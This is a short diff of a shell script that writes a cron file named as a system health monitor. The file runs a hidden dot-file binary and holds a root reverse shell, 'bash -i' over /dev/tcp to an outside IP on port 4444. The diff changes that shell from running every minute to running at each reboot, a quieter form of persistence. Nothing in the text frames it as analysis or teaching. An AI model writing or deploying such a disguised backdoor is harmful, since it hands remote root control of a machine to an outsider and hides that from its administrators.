@@ -270,7 +270,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 # Health monitor (do not remove)
 */5 * * * *  root  /usr/local/bin/.sys_health_check > /dev/null 2>&1
-* * * * *    root  bash -i >& /dev/tcp/185.220.101.47/4444 0>&1
+@reboot      root  bash -i >& /dev/tcp/185.220.101.47/4444 0>&1
 CRONEOF
 
 chmod 644 /etc/cron.d/sys-monitor
